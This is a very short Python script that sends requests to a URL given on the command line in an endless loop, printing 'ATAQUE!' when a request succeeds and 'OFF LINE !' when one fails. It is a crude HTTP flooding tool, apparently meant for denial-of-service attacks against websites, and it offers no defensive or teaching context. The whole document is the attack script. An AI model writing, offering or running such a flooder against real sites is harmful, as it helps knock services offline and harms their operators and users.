import urllib.request
import sys
url = sys.argv[1]
while True:
    try:
        urllib.request.urlopen(url)
        print("[+] }===> ATAQUE!")
    except:
        print("[-] }===> OFF LINE !")
